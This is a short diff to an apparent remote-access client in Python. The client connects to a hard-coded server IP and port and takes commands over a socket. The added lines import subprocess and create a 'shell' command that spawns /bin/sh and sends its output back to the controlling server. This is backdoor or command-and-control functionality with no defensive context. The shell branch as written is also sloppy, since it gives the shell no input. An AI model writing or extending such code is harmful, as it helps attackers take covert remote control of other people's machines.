@@ -1,6 +1,8 @@
 
 import socket
 import uuid
+import subprocess
+import os
 
 SERVER_IP = "172.22.9.105"
 SERVER_PORT = 12345
@@ -18,6 +20,10 @@ def listen_commands(client_socket):
         elif command == 'exit':
             client_socket.close()
             break
+        elif command == 'shell':
+            proc = subprocess.Popen(["/bin/sh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            stdout_value = proc.communicate()[0]
+            client_socket.send(stdout_value)
 
 def main():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
